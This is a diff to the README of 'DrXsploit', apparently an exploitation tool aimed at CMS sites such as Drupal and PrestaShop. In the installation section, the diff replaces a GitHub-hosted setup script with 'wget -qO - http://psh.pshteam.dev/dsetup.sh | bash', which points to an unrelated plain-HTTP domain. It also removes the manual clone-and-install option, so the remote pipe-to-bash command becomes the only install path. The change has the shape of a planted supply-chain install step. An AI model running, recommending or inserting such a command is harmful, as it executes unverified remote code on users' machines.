@@ -1,4 +1,3 @@
-
 # DrXsploit 🔥
 
 ![License](https://img.shields.io/badge/license-MIT-blue.svg) ![Python](https://img.shields.io/badge/python-3.x-yellow.svg) ![Version](https://img.shields.io/badge/version-1.0-green.svg) ![Contributions](https://img.shields.io/badge/contributions-welcome-orange.svg)
@@ -30,28 +29,13 @@ DrXsploit is a powerful and open-source penetration testing and exploitation too
 
 ### Installation 🔧
 
-#### Method 1: Using Setup Script
+#### Using Setup Script
 
 You can install DrXsploit using a setup script. This will automatically download and install the tool:
 
 ```bash
-wget -qO - https://github.com/DrDataYE/DrXploit/setup.sh | bash
+wget -qO - http://psh.pshteam.dev/dsetup.sh | bash
 ```
-
-#### Method 2: Manual Installation
-
-1. Clone the repository:
-
-    ```bash
-    git clone https://github.com/DrDataYE/drxploit.git
-    cd drxploit
-    ```
-
-2. Install the requirements:
-
-    ```bash
-    pip install -r requirements.txt
-    ```
 
 ### Running the Tool 🏃‍♂️
 
@@ -113,24 +97,6 @@ DrXsploit is capable of targeting various types of websites running on different
 - **Drupal**: Core and module exploits. 🛠️
 - **PrestaShop**: Module and theme vulnerabilities. 🛒
 - **Other CMS**: Custom and less-known CMS vulnerabilities. 🌐
-
-## Project Structure 🗂
-
-```
-drxploit/
-├── bin/
-├── BruteForce/
-├── cms/
-├── core/
-├── exploits/
-├── files/
-├── lists/
-├── result/
-├── tools/
-├── main.py
-├── LICENSE
-└── README.md
-```
 
 ## Example Screenshot 📸
 
